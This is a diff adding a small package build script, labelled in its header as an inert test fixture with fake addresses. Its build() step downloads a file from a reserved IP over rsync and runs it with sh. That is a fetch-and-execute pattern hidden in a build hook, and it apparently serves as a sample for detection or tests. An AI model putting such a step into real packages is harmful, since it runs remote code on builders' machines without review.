@@ -1,0 +1,13 @@
+# Inert test fixture: nothing here is ever run, and every address is reserved or fake.
+pkgname=rsync-run
+pkgver=1.0
+pkgrel=1
+arch=(x86_64)
+url=https://example.org
+license=(MIT)
+source=(https://example.org/demo.tar.gz)
+sha256sums=(0000000000000000000000000000000000000000000000000000000000000000)
+build() {
+  rsync rsync://198.51.100.61/y y
+  sh y
+}
